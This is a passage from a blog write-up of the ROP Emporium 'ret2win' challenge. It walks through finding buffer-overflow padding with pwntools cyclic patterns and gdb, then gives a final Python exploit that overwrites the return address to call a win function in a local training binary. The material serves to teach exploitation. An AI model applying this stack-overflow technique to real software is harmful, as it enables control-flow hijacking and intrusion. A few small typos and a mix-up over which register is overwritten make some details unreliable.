posts/2021-03-22-ropemporium-ret2win.org
*** Cyclic patterns
Using cyclic patterns, we can relatively easy find the padding length of our payload.

#+begin_src python 
  from pwn import *

  context.update(arch="amd64", os="linux")
  proc = process("./ret2win")
  gdb.attach(proc, """
  b pwnme""")

  def send_recv(buffer: bytes):
      proc.recvuntil(b">")
      proc.sendline(buffer)
      return proc.recvline()

  payload = cyclic(56)

  send_recv(payload)
  proc.interactive()
#+end_src

Here I used the ~cyclic~ function, from pwntools, to generate a 56 character long [[https://en.wikipedia.org/wiki/De_Bruijn_sequence][de Bruijn sequence]].
Which we can use to find our padding length

The above script also attaches gdb, so we can find the pattern in the registers and use that in our exploit.
#+begin_example
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb
$rbx   : 0x0000000000400780  →  <__libc_csu_init+0> push r15
$rcx   : 0x00007fc84be920f7  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007ffdaa836178  →  0x6161616c6161616b ("kaaalaaa"?)
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00007fc84bf645a3  →  0xf664d0000000000a
$rdi   : 0x00007fc84bf664d0  →  0x0000000000000000
$rip   : 0x0000000000400755  →  <pwnme+109> ret
$r8    : 0xb
$r9    : 0x00007fc84bfad070  →  <_dl_fini+0> endbr64
$r10   : 0xfffffffffffffb8b
$r11   : 0x246
$r12   : 0x00000000004005b0  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
#+end_example

And as you can see ~$rbp~ has some sort of weird string.
If we use the function ~cyclic_find~ in conjunction with ~cyclic~ we can find the padding for the exploit.

#+begin_src python
  from pwn import *

  context.update(arch="amd64", os="linux")
  proc = process("./ret2win")
  gdb.attach(proc, """
  b pwnme""")

  def send_recv(buffer: bytes):
      proc.recvuntil(b">")
      proc.sendline(buffer)
      return proc.recvline()

  payload = cyclic(cyclic_find(0x61616169))
  payload += p64(0xdeadbeefcafebabe)

  send_recv(payload)
  proc.interactive()
#+end_src
If we concentrate on the payload, we see that we first calculate our padding.
After that we add ~0xdeadbeecafebabe~ to ensure that we indeed do have control over ~$rbp~.

#+begin_example
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb
$rbx   : 0x0000000000400780  →  <__libc_csu_init+0> push r15
$rcx   : 0x00007fa3497a50f7  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007fffb9d3f2d0  →  0x0000000000000000
$rbp   : 0xdeadbeefcafebabe
$rsi   : 0x00007fa3498775a3  →  0x8794d0000000000a
$rdi   : 0x00007fa3498794d0  →  0x0000000000000000
$rip   : 0x000000000040060a  →  <deregister_tm_clones+26> or eax, 0x1058bf5d
$r8    : 0xb
$r9    : 0x00007fa3498c0070  →  <_dl_fini+0> endbr64
$r10   : 0xfffffffffffffb8b
$r11   : 0x246
$r12   : 0x00000000004005b0  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
#+end_example
And if I could point your attention to ~$rbp~, you should see that we have indeed control over the base pointer.

** Useful addresses
Since we already know which function we need to execute, and the binary doesn't have PIE enabled, I went ahead and grabbed the address from Binary Ninja.
|---------+----------|
| Name    |  Address |
|---------+----------|
| ret2win | 0x400756 |
|---------+----------|

** Final exploit
So know that we have control over the base pointer let's make it point towards ~ret2win~ and finish this challenge.
#+begin_src python
  from pwn import *

  context.update(arch="amd64", os="linux")
  proc = process("./ret2win")

  def send_recv(buffer: bytes):
      proc.recvuntil(b">")
      proc.sendline(buffer)
      return proc.recvline()


  ret2win_addr = 0x400756


  payload = cyclic(cyclic_find(0x6161616B))
  payload += p64(ret2win_addr)

  send_recv(payload)
  proc.interactive()
#+end_src
As you can see instead of ~0xdeadbeefcafebabe~ we just use ~ret2win_addr~.
And if we run the script:
#+begin_example
┌────[~/ha/bi/ropemporium/ret2win on  master [?]
└─>python exploit.py
[+] Starting local process './ret2win': pid 170719
[*] Switching to interactive mode
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 170719)
[*] Got EOF while sending in interactive
#+end_example

* Conclusion
First of all thank you for reading my first proper write-up.
I hope it won't be the last, as I want to publish a new post/write-up/whatever-you-call-it every other week.

So what did we do here?
We got a /very/ basic introduction to buffer overflows and ROP, but hopefully enough to you hooked ;).
We successfully overflowed a buffer which let us control the return address of the function.

My next post will be about ROPemporium split, where we need to make use of so called ROPgadgets.


